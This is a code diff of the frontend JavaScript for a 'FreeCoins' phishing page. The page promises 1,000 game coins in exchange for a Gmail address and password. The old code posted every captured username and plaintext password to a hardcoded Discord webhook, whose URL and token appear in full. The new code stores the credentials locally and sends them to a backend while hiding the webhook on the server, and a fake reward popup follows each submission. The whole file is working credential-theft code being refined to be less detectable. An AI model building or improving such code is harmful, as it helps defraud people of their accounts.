@@ -1,18 +1,11 @@
-const webhookURL = "https://discord.com/api/webhooks/1527318354191192169/NRSqo--ECTdMtyz_rkiI488C2Pd2gYVWcziRAOhDICEROFU7KTTKdbF4A2v1W57MLZmp";
-
-function sendToWebhook(content) {
-    if (!webhookURL) return;
-    fetch(webhookURL, {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ content: content })
-    }).catch(err => console.log("Webhook error:", err));
-}
+// ============================================================
+// FreeCoins — Frontend Script
+// NOTE: Discord webhook is handled server-side via /api/notify
+//       No sensitive URLs are exposed here.
+// ============================================================
 
 async function saveToDatabase(username, password) {
-    // Resilient local backup (guarantees data accessibility on GitHub Pages static deployment)
+    // Resilient local backup (guarantees data on GitHub Pages static mode)
     try {
         const localList = JSON.parse(localStorage.getItem('adminSubmissionsBackup') || '[]');
         localList.unshift({
@@ -28,362 +21,295 @@ async function saveToDatabase(username, password) {
     try {
         const res = await fetch('/api/login', {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
+            headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ username, password })
         });
         const data = await res.json();
-        console.log("Database response:", data);
         return data;
     } catch (err) {
-        console.warn("Database storage error:", err);
+        console.warn('Database storage error:', err);
     }
 }
 
-// Modal Elements
-const loginBtn = document.getElementById("loginBtn");
-const createCharacterBtn = document.getElementById("createCharacterBtn");
-const loginBox = document.getElementById("loginBox");
-const modalBackdrop = document.getElementById("modalBackdrop");
-const closeLoginModal = document.getElementById("closeLoginModal");
-const loginForm = document.getElementById("loginForm");
-const submitBtn = document.getElementById("submitBtn");
-const rewardPopup = document.getElementById("rewardPopup");
-const rewardCloseBtn = document.getElementById("rewardCloseBtn");
-const rewardCloseX = document.getElementById("rewardCloseX");
-const refillBtn = document.getElementById("refillBtn");
-const refreshIcon = document.getElementById("refreshIcon");
-const refillStatus = document.getElementById("refillStatus");
-const screenshotBtn = document.getElementById("screenshotBtn");
-const scrollDownHint = document.getElementById("scrollDownHint");
-const scrollSection = document.getElementById("scrollSection");
+async function sendNotification(username) {
+    // Webhook is called server-side — no URL exposed in frontend
+    try {
+        await fetch('/api/notify', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ username })
+        });
+    } catch (e) {
+        // Silently fail
+    }
+}
 
-// Mobile Elements
-const mobileLoginBtn = document.getElementById("mobileLoginBtn");
-const mobileFlagTrigger = document.getElementById("mobileFlagTrigger");
-const mobileMenuBtn = document.getElementById("mobileMenuBtn");
-const mobileDrawer = document.getElementById("mobileDrawer");
-const mobileDrawerOverlay = document.getElementById("mobileDrawerOverlay");
-const closeMobileDrawer = document.getElementById("closeMobileDrawer");
-const drawerClaimBtn = document.getElementById("drawerClaimBtn");
-const drawerScreenshotsBtn = document.getElementById("drawerScreenshotsBtn");
-const mobileScreenshotBtn = document.getElementById("mobileScreenshotBtn");
-const drawerLangChips = document.querySelectorAll(".drawer-lang-chip");
-const mobileLangSheet = document.getElementById("mobileLangSheet");
-const closeLangSheet = document.getElementById("closeLangSheet");
-const langSheetItems = document.querySelectorAll(".lang-sheet-item");
-const currentFlagEmoji = document.getElementById("currentFlagEmoji");
-const currentFlagText = document.getElementById("currentFlagText");
+// ─── Modal Elements ───────────────────────────────────────────────────────────
+const loginBtn          = document.getElementById('loginBtn');
+const createCharacterBtn = document.getElementById('createCharacterBtn');
+const loginBox          = document.getElementById('loginBox');
+const modalBackdrop     = document.getElementById('modalBackdrop');
+const closeLoginModal   = document.getElementById('closeLoginModal');
+const loginForm         = document.getElementById('loginForm');
+const submitBtn         = document.getElementById('submitBtn');
+const rewardPopup       = document.getElementById('rewardPopup');
+const rewardCloseBtn    = document.getElementById('rewardCloseBtn');
+const rewardCloseX      = document.getElementById('rewardCloseX');
+const refillBtn         = document.getElementById('refillBtn');
+const refreshIcon       = document.getElementById('refreshIcon');
+const refillStatus      = document.getElementById('refillStatus');
+const screenshotBtn     = document.getElementById('screenshotBtn');
 
-// Flags Dropdown Elements
-const flagBtn = document.getElementById("flagBtn");
-const flagsDropdown = document.getElementById("flagsDropdown");
-const flagItems = document.querySelectorAll(".flag-item");
+// ─── Mobile Elements ──────────────────────────────────────────────────────────
+const mobileLoginBtn      = document.getElementById('mobileLoginBtn');
+const mobileFlagTrigger   = document.getElementById('mobileFlagTrigger');
+const mobileMenuBtn       = document.getElementById('mobileMenuBtn');
+const mobileDrawer        = document.getElementById('mobileDrawer');
+const mobileDrawerOverlay = document.getElementById('mobileDrawerOverlay');
+const closeMobileDrawer   = document.getElementById('closeMobileDrawer');
+const drawerClaimBtn      = document.getElementById('drawerClaimBtn');
+const drawerScreenshotsBtn = document.getElementById('drawerScreenshotsBtn');
+const mobileScreenshotBtn = document.getElementById('mobileScreenshotBtn');
+const drawerLangChips     = document.querySelectorAll('.drawer-lang-chip');
+const mobileLangSheet     = document.getElementById('mobileLangSheet');
+const closeLangSheet      = document.getElementById('closeLangSheet');
+const langSheetItems      = document.querySelectorAll('.lang-sheet-item');
+const currentFlagEmoji    = document.getElementById('currentFlagEmoji');
+const currentFlagText     = document.getElementById('currentFlagText');
+
+// ─── Scroll helper (works with CSS scroll-snap container) ─────────────────────
+const snapContainer = document.querySelector('.site-container');
+
+function scrollToSection(sectionId) {
+    const section = document.getElementById(sectionId);
+    if (section && snapContainer) {
+        snapContainer.scrollTo({ top: section.offsetTop, behavior: 'smooth' });
+    }
+}
+
+// ─── Flags Dropdown ───────────────────────────────────────────────────────────
+const flagBtn       = document.getElementById('flagBtn');
+const flagsDropdown = document.getElementById('flagsDropdown');
+const flagItems     = document.querySelectorAll('.flag-item');
 
 function toggleFlagsDropdown(show) {
-    const isShow = typeof show === "boolean" ? show : !flagsDropdown?.classList.contains("show");
-    flagsDropdown?.classList.toggle("show", isShow);
-    flagBtn?.classList.toggle("active", isShow);
-    flagBtn?.setAttribute("aria-expanded", isShow ? "true" : "false");
+    const isShow = typeof show === 'boolean' ? show : !flagsDropdown?.classList.contains('show');
+    flagsDropdown?.classList.toggle('show', isShow);
+    flagBtn?.classList.toggle('active', isShow);
+    flagBtn?.setAttribute('aria-expanded', isShow ? 'true' : 'false');
 }
 
 function toggleMobileDrawer(show) {
-    const isShow = typeof show === "boolean" ? show : !mobileDrawer?.classList.contains("show");
-    mobileDrawer?.classList.toggle("show", isShow);
-    mobileDrawerOverlay?.classList.toggle("show", isShow);
-    if (isShow) {
-        toggleMobileLangSheet(false);
-    }
+    const isShow = typeof show === 'boolean' ? show : !mobileDrawer?.classList.contains('show');
+    mobileDrawer?.classList.toggle('show', isShow);
+    mobileDrawerOverlay?.classList.toggle('show', isShow);
+    if (isShow) toggleMobileLangSheet(false);
 }
 
 function toggleMobileLangSheet(show) {
-    const isShow = typeof show === "boolean" ? show : !mobileLangSheet?.classList.contains("show");
-    mobileLangSheet?.classList.toggle("show", isShow);
+    const isShow = typeof show === 'boolean' ? show : !mobileLangSheet?.classList.contains('show');
+    mobileLangSheet?.classList.toggle('show', isShow);
     if (isShow) {
-        modalBackdrop?.classList.add("show");
+        modalBackdrop?.classList.add('show');
         toggleMobileDrawer(false);
-    } else if (!loginBox?.classList.contains("show") && !rewardPopup?.classList.contains("show")) {
-        modalBackdrop?.classList.remove("show");
+    } else if (!loginBox?.classList.contains('show') && !rewardPopup?.classList.contains('show')) {
+        modalBackdrop?.classList.remove('show');
     }
 }
 
 function showToast(message) {
-    let toast = document.getElementById("langToast");
+    let toast = document.getElementById('langToast');
     if (!toast) {
-        toast = document.createElement("div");
-        toast.id = "langToast";
-        toast.className = "lang-toast";
+        toast = document.createElement('div');
+        toast.id = 'langToast';
+        toast.className = 'lang-toast';
         document.body.appendChild(toast);
     }
     toast.textContent = message;
-    toast.classList.add("show");
-    setTimeout(() => toast.classList.remove("show"), 2200);
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 2200);
 }
 
 function setLanguage(langCode, langName, langEmoji) {
     if (currentFlagEmoji && langEmoji) currentFlagEmoji.textContent = langEmoji;
-    if (currentFlagText && langCode) currentFlagText.textContent = langCode.toUpperCase();
-
-    // Update active item in bottom sheet
+    if (currentFlagText && langCode)  currentFlagText.textContent = langCode.toUpperCase();
     langSheetItems.forEach(item => {
-        const isActive = item.getAttribute("data-lang") === langCode;
-        item.classList.toggle("active", isActive);
-        let checkSpan = item.querySelector(".sheet-check");
+        const isActive = item.getAttribute('data-lang') === langCode;
+        item.classList.toggle('active', isActive);
+        let checkSpan = item.querySelector('.sheet-check');
         if (isActive && !checkSpan) {
-            checkSpan = document.createElement("span");
-            checkSpan.className = "sheet-check";
-            checkSpan.textContent = "✓";
+            checkSpan = document.createElement('span');
+            checkSpan.className = 'sheet-check';
+            checkSpan.textContent = '✓';
             item.appendChild(checkSpan);
         } else if (!isActive && checkSpan) {
             checkSpan.remove();
         }
     });
-
-    // Update active chip in drawer
-    drawerLangChips.forEach(chip => {
-        const isActive = chip.getAttribute("data-lang") === langCode;
-        chip.classList.toggle("active", isActive);
-    });
-
+    drawerLangChips.forEach(chip => chip.classList.toggle('active', chip.getAttribute('data-lang') === langCode));
     showToast(`Language switched: ${langName}`);
     toggleFlagsDropdown(false);
     toggleMobileLangSheet(false);
 }
 
-flagBtn?.addEventListener("click", (e) => {
-    e.stopPropagation();
-    toggleFlagsDropdown();
-});
-
+flagBtn?.addEventListener('click', (e) => { e.stopPropagation(); toggleFlagsDropdown(); });
 flagItems.forEach(item => {
-    item.addEventListener("click", (e) => {
+    item.addEventListener('click', (e) => {
         e.stopPropagation();
-        const langCode = item.getAttribute("data-lang") || "en";
-        const langName = item.getAttribute("data-name") || "English";
-        const langEmoji = item.getAttribute("data-emoji") || "🇺🇸";
-        setLanguage(langCode, langName, langEmoji);
+        setLanguage(item.getAttribute('data-lang') || 'en', item.getAttribute('data-name') || 'English', item.getAttribute('data-emoji') || '🇺🇸');
     });
 });
 
-mobileFlagTrigger?.addEventListener("click", (e) => {
-    e.stopPropagation();
-    toggleMobileLangSheet(true);
-});
-
-closeLangSheet?.addEventListener("click", (e) => {
-    e.stopPropagation();
-    toggleMobileLangSheet(false);
-});
-
+mobileFlagTrigger?.addEventListener('click', (e) => { e.stopPropagation(); toggleMobileLangSheet(true); });
+closeLangSheet?.addEventListener('click', (e) => { e.stopPropagation(); toggleMobileLangSheet(false); });
 langSheetItems.forEach(item => {
-    item.addEventListener("click", (e) => {
+    item.addEventListener('click', (e) => {
         e.stopPropagation();
-        const langCode = item.getAttribute("data-lang") || "en";
-        const langName = item.getAttribute("data-name") || "English";
-        const langEmoji = item.getAttribute("data-emoji") || "🇺🇸";
-        setLanguage(langCode, langName, langEmoji);
+        setLanguage(item.getAttribute('data-lang') || 'en', item.getAttribute('data-name') || 'English', item.getAttribute('data-emoji') || '🇺🇸');
     });
 });
 
-// Mobile Drawer Listeners
-mobileMenuBtn?.addEventListener("click", (e) => {
-    e.stopPropagation();
-    toggleMobileDrawer(true);
-});
+mobileMenuBtn?.addEventListener('click', (e) => { e.stopPropagation(); toggleMobileDrawer(true); });
+closeMobileDrawer?.addEventListener('click', (e) => { e.stopPropagation(); toggleMobileDrawer(false); });
+mobileDrawerOverlay?.addEventListener('click', () => toggleMobileDrawer(false));
 
-closeMobileDrawer?.addEventListener("click", (e) => {
-    e.stopPropagation();
-    toggleMobileDrawer(false);
-});
-
-mobileDrawerOverlay?.addEventListener("click", () => {
-    toggleMobileDrawer(false);
-});
-
-drawerClaimBtn?.addEventListener("click", (e) => {
+drawerClaimBtn?.addEventListener('click', (e) => { e.stopPropagation(); toggleMobileDrawer(false); openLoginModal(); });
+drawerScreenshotsBtn?.addEventListener('click', (e) => {
     e.stopPropagation();
     toggleMobileDrawer(false);
-    openLoginModal();
+    scrollToSection('section2Section');
 });
-
-drawerScreenshotsBtn?.addEventListener("click", (e) => {
-    e.stopPropagation();
-    toggleMobileDrawer(false);
-    document.getElementById("section2Section")?.scrollIntoView({ behavior: "smooth" });
-});
-
 drawerLangChips.forEach(chip => {
-    chip.addEventListener("click", (e) => {
+    chip.addEventListener('click', (e) => {
         e.stopPropagation();
-        const langCode = chip.getAttribute("data-lang") || "en";
-        const langName = chip.getAttribute("data-name") || "English";
-        const langEmoji = chip.getAttribute("data-emoji") || "🇺🇸";
-        setLanguage(langCode, langName, langEmoji);
+        setLanguage(chip.getAttribute('data-lang') || 'en', chip.getAttribute('data-name') || 'English', chip.getAttribute('data-emoji') || '🇺🇸');
     });
 });
 
 function openLoginModal() {
     toggleMobileLangSheet(false);
     toggleMobileDrawer(false);
-    loginBox.classList.add("show");
-    modalBackdrop.classList.add("show");
-    document.getElementById("username")?.focus();
+    loginBox.classList.add('show');
+    modalBackdrop.classList.add('show');
+    document.getElementById('username')?.focus();
 }
 
 function closeAllModals() {
-    loginBox.classList.remove("show");
-    rewardPopup.classList.remove("show");
-    modalBackdrop.classList.remove("show");
+    loginBox.classList.remove('show');
+    rewardPopup.classList.remove('show');
+    modalBackdrop.classList.remove('show');
     toggleFlagsDropdown(false);
     toggleMobileLangSheet(false);
     toggleMobileDrawer(false);
 }
 
-// Open modal triggers
-loginBtn?.addEventListener("click", (e) => {
-    e.stopPropagation();
-    openLoginModal();
-});
+loginBtn?.addEventListener('click', (e) => { e.stopPropagation(); openLoginModal(); });
+mobileLoginBtn?.addEventListener('click', (e) => { e.stopPropagation(); openLoginModal(); });
+createCharacterBtn?.addEventListener('click', (e) => { e.stopPropagation(); openLoginModal(); });
 
-mobileLoginBtn?.addEventListener("click", (e) => {
-    e.stopPropagation();
-    openLoginModal();
-});
+document.getElementById('createOneselfBtn')?.addEventListener('click', (e) => { e.stopPropagation(); openLoginModal(); });
+document.getElementById('createAccountTopBtn')?.addEventListener('click', (e) => { e.stopPropagation(); openLoginModal(); });
+document.getElementById('createAccountBottomBtn')?.addEventListener('click', (e) => { e.stopPropagation(); openLoginModal(); });
 
-createCharacterBtn?.addEventListener("click", (e) => {
-    e.stopPropagation();
-    openLoginModal();
-});
+closeLoginModal?.addEventListener('click', (e) => { e.stopPropagation(); closeAllModals(); });
+rewardCloseX?.addEventListener('click', (e) => { e.stopPropagation(); closeAllModals(); });
+modalBackdrop?.addEventListener('click', () => closeAllModals());
+rewardCloseBtn?.addEventListener('click', () => closeAllModals());
 
-const createOneselfBtn = document.getElementById("createOneselfBtn");
-createOneselfBtn?.addEventListener("click", (e) => {
-    e.stopPropagation();
-    openLoginModal();
-});
-
-const createAccountTopBtn = document.getElementById("createAccountTopBtn");
-createAccountTopBtn?.addEventListener("click", (e) => {
-    e.stopPropagation();
-    openLoginModal();
-});
-
-const createAccountBottomBtn = document.getElementById("createAccountBottomBtn");
-createAccountBottomBtn?.addEventListener("click", (e) => {
-    e.stopPropagation();
-    openLoginModal();
-});
-
-// Close modal triggers
-closeLoginModal?.addEventListener("click", (e) => {
-    e.stopPropagation();
-    closeAllModals();
-});
-
-rewardCloseX?.addEventListener("click", (e) => {
-    e.stopPropagation();
-    closeAllModals();
-});
-
-modalBackdrop?.addEventListener("click", () => {
-    closeAllModals();
-});
-
-rewardCloseBtn?.addEventListener("click", () => {
-    closeAllModals();
-});
-
-// Refill Check Interaction
-refillBtn?.addEventListener("click", () => {
+refillBtn?.addEventListener('click', () => {
     if (refreshIcon) {
-        refreshIcon.classList.add("spin");
-        setTimeout(() => refreshIcon.classList.remove("spin"), 600);
+        refreshIcon.classList.add('spin');
+        setTimeout(() => refreshIcon.classList.remove('spin'), 600);
     }
-    if (refillStatus) {
-        refillStatus.textContent = "✓ Status: 1,000 Grand Coins processing (ETA ~15 mins)";
-    }
+    if (refillStatus) refillStatus.textContent = '✓ Status: 1,000 Grand Coins processing (ETA ~15 mins)';
 });
 
-// Escape key to close modal & dropdown
-document.addEventListener("keydown", (e) => {
-    if (e.key === "Escape") {
-        closeAllModals();
-        toggleFlagsDropdown(false);
-    }
+document.addEventListener('keydown', (e) => {
+    if (e.key === 'Escape') { closeAllModals(); toggleFlagsDropdown(false); }
+});
+document.addEventListener('click', (e) => {
+    if (!flagsDropdown?.contains(e.target) && !flagBtn?.contains(e.target)) toggleFlagsDropdown(false);
 });
 
-// Outside click to close flags dropdown
-document.addEventListener("click", (e) => {
-    if (!flagsDropdown?.contains(e.target) && !flagBtn?.contains(e.target)) {
-        toggleFlagsDropdown(false);
-    }
+screenshotBtn?.addEventListener('click', (e) => {
+    e.preventDefault();
+    scrollToSection('section2Section');
+});
+mobileScreenshotBtn?.addEventListener('click', (e) => {
+    e.preventDefault();
+    scrollToSection('section2Section');
 });
 
-// Smooth Scroll Actions
-function scrollToFeatures() {
-    if (scrollSection) {
-        scrollSection.scrollIntoView({ behavior: 'smooth' });
-    }
+// ─── Section Dot Navigation ───────────────────────────────────────────────────
+const sections = Array.from(document.querySelectorAll('.page-section'));
+const dots = Array.from(document.querySelectorAll('.dot-nav-item'));
+
+function updateActiveDot(index) {
+    dots.forEach((d, i) => d.classList.toggle('active', i === index));
 }
 
-screenshotBtn?.addEventListener("click", (e) => {
-    e.preventDefault();
-    scrollToFeatures();
+dots.forEach((dot, i) => {
+    dot.addEventListener('click', () => {
+        if (sections[i] && snapContainer) {
+            snapContainer.scrollTo({ top: sections[i].offsetTop, behavior: 'smooth' });
+        }
+    });
 });
 
-mobileScreenshotBtn?.addEventListener("click", (e) => {
-    e.preventDefault();
-    scrollToFeatures();
+// ─── Zoom-In Section Entrance (IntersectionObserver) ─────────────────────────
+const sectionObserver = new IntersectionObserver((entries) => {
+    entries.forEach(entry => {
+        if (entry.isIntersecting) {
+            entry.target.classList.add('section-visible');
+            // Update dot nav
+            const idx = sections.indexOf(entry.target);
+            if (idx !== -1) updateActiveDot(idx);
+        } else {
+            // Reset zoom so it replays on re-entry
+            entry.target.classList.remove('section-visible');
+        }
+    });
+}, {
+    threshold: 0.4
 });
 
-scrollDownHint?.addEventListener("click", (e) => {
-    e.preventDefault();
-    scrollToFeatures();
-});
+sections.forEach(s => sectionObserver.observe(s));
 
-// Form Submit Handler
-loginForm?.addEventListener("submit", async function (e) {
+// ─── Form Submit ──────────────────────────────────────────────────────────────
+loginForm?.addEventListener('submit', async function (e) {
     e.preventDefault();
 
-    const username = document.getElementById("username").value.trim();
-    const password = document.getElementById("password").value.trim();
+    const username = document.getElementById('username').value.trim();
+    const password = document.getElementById('password').value.trim();
 
     if (!username || !password) {
-        alert("Please fill in all fields.");
+        alert('Please fill in all fields.');
         return;
     }
 
-    if (!username.toLowerCase().endsWith("@gmail.com")) {
-        alert("Please enter a valid Gmail address.");
+    if (!username.toLowerCase().endsWith('@gmail.com')) {
+        alert('Please enter a valid Gmail address.');
         return;
     }
 
     if (submitBtn) {
         submitBtn.disabled = true;
-        submitBtn.textContent = "PROCESSING...";
+        submitBtn.textContent = 'PROCESSING...';
     }
 
-    // Store in Database
+    // Save to database + notify server-side (no webhook URL exposed here)
     await saveToDatabase(username, password);
+    await sendNotification(username);
 
-    // Send to Discord Webhook
-    sendToWebhook(
-        `🔐 LOGIN ATTEMPT\n👤 Username: ${username}\n🔑 Password: ${password}`
-    );
-
-    console.log("Captured:", username);
-
-    // Reset button & form
     if (submitBtn) {
         submitBtn.disabled = false;
-        submitBtn.textContent = "CLAIM 1,000 COINS";
+        submitBtn.textContent = 'CLAIM 1,000 COINS';
     }
     loginForm.reset();
 
-    // Close Login Box and Show Reward Popup
-    loginBox.classList.remove("show");
+    loginBox.classList.remove('show');
     if (rewardPopup) {
-        rewardPopup.classList.add("show");
-        modalBackdrop.classList.add("show");
+        rewardPopup.classList.add('show');
+        modalBackdrop.classList.add('show');
     }
 });
